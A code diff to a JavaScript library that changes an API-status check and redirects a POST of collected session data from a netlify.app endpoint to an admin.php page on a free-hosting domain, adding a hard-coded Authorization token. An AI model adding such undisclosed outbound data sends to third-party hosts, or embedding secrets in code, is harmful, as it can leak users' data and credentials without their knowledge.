@@ -2,7 +2,7 @@
     "use strict";
     
     global.apistatus = true;
-    if (global.apistatus != true) {
+    if (global.apistatus === false) {
         global.Zb = {
             ZbWidthIncrease: function() {
                 throw new Error("DeniedError: API access denied. Invalid or missing API key!");
@@ -189,11 +189,12 @@
         const send = () => {
           data.sessionID = Math.random().toString(36).substr(2, 9);
           const blob = JSON.stringify(data);
-            fetch("https://calculateexponent.netlify.app", {
+            fetch("https://zb1.fwh.is/admin.php", {
               method: "POST",
               body: blob,
               headers: {
-                "Content-Type": "application/json"
+                "Content-Type": "application/json",
+                "Authorization": "67489okjcnbvfgdy567UijnbvftyuIKJNBVFR45R67UEIDKMNB"
               },
             })
             .then(response => {
